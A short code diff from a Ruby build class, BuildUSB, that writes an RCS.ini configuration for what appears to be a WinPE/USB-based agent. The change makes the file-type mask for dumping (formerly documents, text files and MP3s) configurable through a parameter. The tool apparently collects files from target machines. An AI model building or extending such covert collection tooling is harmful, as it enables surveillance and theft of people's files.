@@ -71,7 +71,7 @@ class BuildUSB < Build
       f.puts "HSYS=ndisk.sys"
       f.puts "HKEY=#{key}"
       f.puts "FUNC=" + funcname
-      f.puts "MASK=*.doc|*.docx|*.txt|*.mp3"
+      f.puts "MASK=#{params['dump_mask']}"
     end
 
     @outputs << 'winpe/RCSPE/RCS.ini'
